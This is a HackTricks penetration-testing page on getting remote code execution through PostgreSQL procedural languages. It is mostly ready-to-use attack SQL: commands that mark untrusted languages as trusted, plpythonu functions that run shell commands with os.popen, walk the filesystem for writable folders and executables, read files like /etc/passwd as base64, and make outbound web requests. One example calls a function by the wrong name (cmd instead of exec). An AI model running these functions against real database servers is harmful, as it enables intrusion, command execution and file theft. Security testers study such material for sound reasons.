# RCE with PostgreSQL Languages

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## PostgreSQL Languages

The PostgreSQL database you got access to may have different **scripting languages installed** that you could abuse to **execute arbitrary code**.

You can **get them running**:

```sql
\dL *

SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```

Most of the scripting languages you can install in PostgreSQL have **2 flavours**: the **trusted** and the **untrusted**. The **untrusted** will have a name **ended in "u"** and will be the version that will allow you to **execute code** and use other interesting functions. This are languages that if installed are interesting:

* **plpythonu**
* **plpython3u**
* **plperlu**
* **pljavaU**
* **plrubyu**
* ... (any other programming language using an insecure version)

{% hint style="warning" %}
If you find that an interesting language is **installed** but **untrusted** by PostgreSQL (**`lanpltrusted`** is **`false`**) you can try to **trust it** with the following line so no restrictions will be applied by PostgreSQL:

```sql
UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
# To check your permissions over the table pg_language
SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
```
{% endhint %}

{% hint style="danger" %}
If you don't see a language, you could try to load it with (**you need to be superadmin**):

```
CREATE EXTENSION plpythonu;
CREATE EXTENSION plpython3u;
CREATE EXTENSION plperlu;
CREATE EXTENSION pljavaU;
CREATE EXTENSION plrubyu;
```
{% endhint %}

Note that it's possible to compile the secure versions as "unsecure". Check [**this**](https://www.robbyonrails.com/articles/2005/08/22/installing-untrusted-pl-ruby-for-postgresql.html) for example. So it's always worth trying if you can execute code even if you only find installed the **trusted** one.

## plpythonu/plpython3u

{% tabs %}
{% tab title="RCE" %}
```sql
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.popen(cmd).read()
    #return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```
{% endtab %}

{% tab title="Get OS user" %}
```sql
CREATE OR REPLACE FUNCTION get_user (pkg text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.getlogin()
$$
LANGUAGE 'plpythonu';

SELECT get_user(""); #Get user, para is useless
```
{% endtab %}

{% tab title="List dir" %}
```sql
CREATE OR REPLACE FUNCTION lsdir (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import json
    from os import walk
    files = next(walk(dir), (None, None, []))
    return json.dumps({"root": files[0], "dirs": files[1], "files": files[2]})[:65535]
$$
LANGUAGE 'plpythonu';

SELECT lsdir("/"); #List dir
```
{% endtab %}

{% tab title="Find W folder" %}
```sql
CREATE OR REPLACE FUNCTION findw (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        writables = []
        def find_writable(path):
            if not os.path.isdir(path):
                return
            if os.access(path, os.W_OK):
                writables.append(path)
            if not os.listdir(path):
                return
            else:
                for item in os.listdir(path):
                    find_writable(os.path.join(path, item))
        find_writable(path)
        return writables
    
    return ", ".join(my_find(dir))
$$
LANGUAGE 'plpythonu';

SELECT findw("/"); #Find Writable folders from a folder (recursively)
```
{% endtab %}

{% tab title="Find File" %}
```sql
CREATE OR REPLACE FUNCTION find_file (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in os.path.basename(i):
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_file("psql"); #Find a file
```
{% endtab %}

{% tab title="Find executables" %}
```sql
CREATE OR REPLACE FUNCTION findx (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find(dir)
    b = []

    for i in a:
        b.append(os.path.basename(i))
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT findx("/"); #Find an executables in folder (recursively)
```
{% endtab %}

{% tab title="Find exec by subs" %}
```sql
CREATE OR REPLACE FUNCTION find_exe (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in i:
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_exe("psql"); #Find executable by susbstring
```
{% endtab %}

{% tab title="Read" %}
```sql
CREATE OR REPLACE FUNCTION read (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import base64
    encoded_string= base64.b64encode(open(path).read())
    return encoded_string.decode('utf-8')
    return open(path).read()
$$
LANGUAGE 'plpythonu';

select read('/etc/passwd'); #Read a file in b64
```
{% endtab %}

{% tab title="Get perms" %}
```sql
CREATE OR REPLACE FUNCTION get_perms (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    status = os.stat(path)
    perms = oct(status.st_mode)[-3:]
    return str(perms)
$$
LANGUAGE 'plpythonu';

select get_perms("/etc/passwd"); # Get perms of file
```
{% endtab %}

{% tab title="Request" %}
```sql
CREATE OR REPLACE FUNCTION req2 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    import urllib
    r = urllib.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req2('https://google.com'); #Request using python2

CREATE OR REPLACE FUNCTION req3 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    from urllib import request
    r = request.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req3('https://google.com'); #Request using python3
```
{% endtab %}
{% endtabs %}

## pgSQL

Check the following page:

{% content-ref url="pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## C

Check the following page:

{% content-ref url="rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](rce-with-postgresql-extensions.md)
{% endcontent-ref %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
